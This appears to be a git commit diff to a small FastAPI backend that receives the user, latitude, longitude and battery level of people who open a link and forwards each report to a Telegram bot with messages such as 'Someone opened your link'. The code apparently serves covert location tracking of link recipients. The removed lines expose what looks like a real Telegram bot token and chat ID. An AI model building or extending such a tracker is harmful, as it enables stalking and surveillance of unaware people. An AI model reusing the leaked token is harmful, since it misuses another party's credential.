220eda2fd34946be53bcc3ea5a11ba984878f9db
rohanghoghari111 <rohanghoghari56@gmail.com>
2026-03-21 18:00:34 +0530

    env added + code fix

--- backend/main.py
+++ backend/main.py
@@ -2,13 +2,15 @@ from fastapi import FastAPI, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.staticfiles import StaticFiles
 import requests
+import os
 
 app = FastAPI()
 
 locations = []
 
-TELEGRAM_TOKEN = os.getenv("8521809713:AAFAZisC2JzlyeDax_EMBRuo6ebVQXGn4DQ")
-CHAT_ID = os.getenv("7675394721")
+# ✅ ENV variables use કર
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
 
 app.add_middleware(
     CORSMiddleware,
@@ -20,14 +22,13 @@ app.add_middleware(
 
 @app.post("/location")
 async def receive_location(request: Request):
-
     data = await request.json()
 
     locations.append(data)
     if len(locations) > 100:
         locations.pop(0)
 
-    user = data.get("user")
+    user = data.get("user", "Unknown")
     lat = data.get("latitude")
     lon = data.get("longitude")
     battery = data.get("battery")
@@ -38,7 +39,7 @@ async def receive_location(request: Request):
 User : {user}
 Latitude : {lat}
 Longitude : {lon}
-Battery : {battery}%
+Battery : {battery}
 """
 
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
@@ -56,10 +57,9 @@ Battery : {battery}%
 
 @app.post("/visit")
 async def visit(request: Request):
-
     data = await request.json()
 
-    user = data.get("user")
+    user = data.get("user", "Unknown")
 
     message = f"""
 👀 Someone opened your link
@@ -69,12 +69,16 @@ User : {user}
 
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
 
-    requests.post(url, json={
-        "chat_id": CHAT_ID,
-        "text": message
-    })
+    try:
+        requests.post(url, json={
+            "chat_id": CHAT_ID,
+            "text": message
+        })
+    except:
+        pass
 
     return {"status": "ok"}
+
 
 @app.get("/locations")
 async def get_locations():
